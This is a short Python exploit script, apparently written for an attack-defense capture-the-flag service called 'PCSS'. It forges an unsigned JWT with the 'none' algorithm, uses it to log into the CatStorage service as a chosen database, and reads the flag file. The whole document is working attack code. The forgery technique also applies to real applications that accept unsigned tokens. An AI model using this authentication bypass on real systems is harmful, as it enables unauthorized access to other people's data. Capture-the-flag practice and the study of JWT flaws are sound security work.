#!/usr/bin/env python3

class config:
    service = "PCSS"
    #CHANGE ME!!!!
    team_token = "token"
    my_team_ip = "10.60.team_id.1" 

from _pcss_client_utils import CatStorage
import base64, json

def attack(team_ip: str, flag_id):
    #The bugged jwt is encoded manually but you could also use a jwt lib to make it
    first_part = base64.b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).decode().replace("=", "")
    data_part = base64.b64encode(json.dumps({'db': flag_id['db_name']}).encode()).decode().replace("=", "")
    jwt = f"{first_part}.{data_part}."
    conn = CatStorage(team_ip)
    conn.login(jwt)
    result = conn.read_file(flag_id["filename"])
    conn.close()
    return result
